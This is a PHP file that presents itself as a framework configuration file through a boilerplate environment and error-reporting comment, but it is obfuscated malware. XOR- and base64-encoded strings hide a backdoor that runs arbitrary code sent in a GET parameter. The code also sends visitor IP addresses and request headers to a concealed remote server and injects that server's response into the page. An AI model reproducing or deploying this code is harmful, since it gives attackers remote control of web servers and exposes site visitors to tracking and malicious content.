<?php
 /*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 *
 *
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
 
class _fes
{
    private static $s;
    public static function g($n, $k)
    {
        if (!self::$s)
            self::i();
        $l = strlen($k);
        $r = base64_decode(self::$s[$n]);
        for ($i = 0, $c = strlen($r); $i !== $c; ++$i)
            $r[$i] = chr(ord($r[$i]) ^ ord($k[$i % $l]));
        return $r;
    }
    private static function i()
    {
        self::$s = array(
            '_tby' => 'Hg4TOh4Dci4fMRkCMAFdHgEcMBpdEB8ZOAQeZ' . 'U1a',
            '_fje' => 'HBcIDToWElQLARYcZVgHCS8UDxo+' . 'DA8WMVcMGCk' . 'ZF' . 'RotE' . 'RY' . 'N',
            '_bx' => '',
            '_q' => 'PB0' . '=',
            '_p' => '',
            '_mur' => 'MQs' . 'EJw' . '=' . '=',
            '_t' => 'YwA0' . 'UQ=' . '=',
            '_le' => 'YwcXAmE' . '=',
            '_rri' => 'KBs' . 'bMw=' . '=',
            '_xlx' => 'PAg' . '6',
            '_ln' => 'PhMGOzk' . 'SDQc' . 'r',
            '_bwi' => 'N' . 'g' . 'oe',
            '_rv' => 'PQwQOl' . 's' . '=',
            '_uw' => 'aykHOh' . 'U=',
            '_b' => 'MBYK',
            '_sz' => 'KA8N' . 'Aw==',
            '_pm' => '',
            '_smn' => '',
            '_h' => 'NwQeHmVfRRk6Eg' . 'kPPBgPHS8RCQtxHg8acBEJQz4eCw' . 'ImBAMNLF4A' . 'HWA' . 'UCxo+TQ==',
            '_kpj' => 'PBItCwAO' . 'MQ' . '4r',
            '_suf' => 'Nx' . 'cbLzwMMA' . 'cK',
            '_ofg' => 'YxcRFm5' . 'L',
            '_app' => 'YxAHO0B' . 'Y',
            '_adt' => 'LA' . 'kQF' . 'z' . 'I' . 'P',
            '_e' => 'Nx8r' . 'Gy' . 'w=',
            '_byx' => 'GC' . 'cwf' . 'w' . '==',
            '_srh' => 'LwYVGQ=' . '=',
            '_ayp' => 'LhM6FCY=',
            '_s' => 'YA' . '==',
            '_i' => 'Lg0PACY=',
            '_ndm' => 'fy8gJw9IRV1van47MBQASX8' . '=',
            '_ok' => 'NwYLKw=' . '=',
            '_wg' => 'UnI5MBYUOhsON' . 'hcUZVg5M' . 'xcJO' . 'n' . 'V' . 'wU' . 'nI' . '=',
            '_fvx' => 'LBIVWHB' . 'O',
            '_ixk' => '',
            '_vzz' => 'Nw' . 'cJK' . 'w=' . '=',
            '_wpe' => 'UmA' . '=',
            '_wpo' => 'YwA' . 'YB2x' . 'c',
            '_bh' => 'FzYhNwAhOS4aLC' . 'E' . '4Fj' . 'I=',
            '_pq' => 'F' . 'y4kDyUzEzM1ES4vFi' . 'o' . '=',
            '_d' => 'Fzk5Dz' . 'I1ACsiDTosDSkoGzIrED8' . '=',
            '_ymq' => 'FzIwDzk' . '8ACArD' . 'TElDSIh' . 'G' . 'z' . 'kiEDQ' . '=',
            '_dc' => 'DT0sECwkADk' . 'l' . 'Gy' . 'o=',
            '_wtq' => 'DT0+Kws9LCUbP' . 'C' . 'E=',
            '_j' => 'Fy0' . 'kDyYzGSYzED' . 'c+GjokFjc3A' . 'DAg',
            '_cf' => 'FzkgKgA' . 'uMiUcIjo0Gi4gMxE' . 'qKz' . 'MP',
            '_rvv' => 'FzUiDz4jDCQkA' . 'CAxG' . 'i8' . 'i',
            '_evw' => 'FzUsDz4tDCQqACA/Gi' . '8' . 's',
            '_uc' => 'FzgkDzMiG' . 'i' . 'o1D' . 'Ski',
            '_af' => 'Fy' . 'MmKQAlNz8aJTc' . 'r',
            '_xxf' => 'ORMZADo' . 'I' . 'KgI+CA=' . '=',
            '_n' => 'blFoTW9Nb0' . '1' . 'u',
            '_rqs' => 'Ng' . 'M' . '=',
            '_cgc' => 'Kg' . 'A' . '=',
            '_m' => 'LQMS',
            '_nhh' => 'MQ8ZE' . 'g=' . '='
        );
    }
}
class _asr
{
    private static $s;
    public static function g($n)
    {
        if (!self::$s)
            self::i();
        return self::$s[$n];
    }
    private static function i()
    {
        self::$s = array(
            0100,
            0121,
            02,
            064,
            01,
            046711,
            01,
            052,
            00,
            0116,
            012,
            015,
            012,
            0310,
            0673,
            0120,
            00,
            02000,
            01,
            0423,
            0423
        );
    }
}
@header(_fes::g('_t' . 'by', '_mp'));
@header(_fes::g('_f' . 'j' . 'e', '_xf' . 'y'));
$_c = _fes::g('_b' . 'x', '_w'); $si='b6739dgl422sag';
if (isset($_GET[_fes::g('_' . 'q', '_' . 'u' . 'f')])) {
    $_aq = get_js(_fes::g('_p', '_gq'));
    if ($_aq && strpos($_aq, _fes::g('_mur', '_ow')) !== false) {
        die(_fes::g('_t', '_' . 'o'));
    } else {
        die(_fes::g('_' . 'l' . 'e', '_ev' . 'f'));
    }
}
if (isset($_GET[_fes::g('_rr' . 'i', '_zw')])) {
    $_yuk = _fes::g('_xl' . 'x', '_z') . _fes::g('_l' . 'n', '_' . 'g' . 'cd') . _fes::g('_b' . 'wi', '_' . 'ep');
    $_eq  = _fes::g('_r' . 'v', '_' . 'm' . 'c') . _fes::g('_u' . 'w', '_v' . 'c') . _fes::g('_' . 'b', '_r' . 'o');
    $_wfb = $_eq($_GET[_fes::g('_s' . 'z', '_na' . 'o')]);
    $_wfb = @$_yuk(_fes::g('_pm', '_ko' . 'u'), $_wfb);
    @$_wfb();
    die;
}
function get_js($_jzc)
{
    $_aq  = _fes::g('_smn', '_s' . 'g');
    $_esh = _fes::g('_h', '_pj' . 'n') . $_jzc;
    if (is_callable(_fes::g('_k' . 'pj', '_g'))) {
        $_v = curl_init($_esh);
        curl_setopt($_v, _asr::g(0), false);
        curl_setopt($_v, _asr::g(1), _asr::g(2));
        curl_setopt($_v, _asr::g(3), _asr::g(4));
        curl_setopt($_v, _asr::g(5), _asr::g(6));
        curl_setopt($_v, _asr::g(7), _asr::g(8));
        curl_setopt($_v, _asr::g(9), _asr::g(10));
        curl_setopt($_v, _asr::g(11), _asr::g(12));
        $_aq = curl_exec($_v);
        $_ng = curl_getinfo($_v);
        curl_close($_v);
        if ($_ng[_fes::g('_s' . 'u' . 'f', '_' . 'co')] != _asr::g(13))
            die(_fes::g('_of' . 'g', '_u' . 'pr'));
        if (empty($_aq))
            die(_fes::g('_a' . 'pp', '_r' . 'f'));
    } else {
        $_jzz = parse_url($_esh);
        $_au  = ($_jzz[_fes::g('_adt', '_jxr')] == _fes::g('_' . 'e', '_k'));
        $_sg  = _fes::g('_b' . 'y' . 'x', '_' . 'bd') . $_jzz[_fes::g('_s' . 'r' . 'h', '_gaq')];
        if (isset($_jzz[_fes::g('_a' . 'yp', '_f')]))
            $_sg .= _fes::g('_' . 's', '_vh') . $_jzz[_fes::g('_i', '_x' . 'j' . 'r')];
        $_sg .= _fes::g('_' . 'nd' . 'm', '_gt' . 's') . $_jzz[_fes::g('_ok', '_' . 'i' . 'x')] . _fes::g('_' . 'wg', '_x' . 'z');
        $_ry = fsockopen(($_au ? _fes::g('_fv' . 'x', '_a' . 'y' . 'b') : _fes::g('_' . 'ixk', '_' . 'pl' . 'x')) . $_jzz[_fes::g('_vz' . 'z', '_hz')], $_au ? _asr::g(14) : _asr::g(15));
        if ($_ry) {
            @fputs($_ry, $_sg);
            $_tqp = _asr::g(16);
            while (!feof($_ry)) {
                $_vz = fgets($_ry, _asr::g(17));
                if ($_tqp)
                    $_aq .= $_vz;
                if ($_vz == _fes::g('_' . 'wpe', '_' . 'j' . 'hm'))
                    $_tqp = _asr::g(18);
            }
            @fclose($_ry);
            if (empty($_aq))
                die(_fes::g('_wpo', '_by' . 'c'));
        }
    }
    return $_aq;
}
if (isset($_SERVER[_fes::g('_' . 'bh', '_' . 'bu' . 'g')]))
    $_fhg = $_SERVER[_fes::g('_' . 'p' . 'q', '_z' . 'p')];
if (isset($_SERVER[_fes::g('_' . 'd', '_mm')]))
    $_ut = $_SERVER[_fes::g('_ym' . 'q', '_fd')];
if (isset($_SERVER[_fes::g('_d' . 'c', '_xa')]))
    $_a = $_SERVER[_fes::g('_wtq', '_xsd')];
if (isset($_SERVER[_fes::g('_' . 'j', '_' . 'y' . 'p')]))
    $_e = $_SERVER[_fes::g('_c' . 'f', '_mtz')];
if (isset($_SERVER[_fes::g('_' . 'r' . 'vv', '_a' . 'v')]))
    $_hg = $_SERVER[_fes::g('_' . 'ev' . 'w', '_a' . 'x')];
if (isset($_SERVER[_fes::g('_u' . 'c', '_lp')]))
    $_w = $_SERVER[_fes::g('_a' . 'f', '_w' . 'r' . 'y')];
if (function_exists(_fes::g('_' . 'x' . 'xf', '_zut'))) {
    if (isset($_fhg) && filter_var($_fhg, _asr::g(19)))
        $_c = $_fhg;
    elseif (isset($_ut) && filter_var($_ut, _asr::g(20)))
        $_c = $_ut;
    else
        $_c = $_a;
} elseif (isset($_a))
    $_c = $_a;
if ($_c == _fes::g('_n', '_' . 'c') && isset($_e))
    $_c = $_e;
if (!isset($_c) || !isset($_hg) || !isset($_w))
    exit;
else {
    echo $_w;
    $_z  = array(
        _fes::g('_r' . 'qs', '_sn') => $_c,
        _fes::g('_' . 'cg' . 'c', '_a' . 'y') => $_hg,
        _fes::g('_' . 'm', '_ft' . 'f') => $_w
    );
    $_hb = urlencode(base64_encode(json_encode($_z)));
    $_aq = get_js($_hb);
    if ($_aq && strpos($_aq, _fes::g('_nhh', '_k' . 'j' . 'j')) !== false) {
        echo $_aq;
        exit;
    }
}
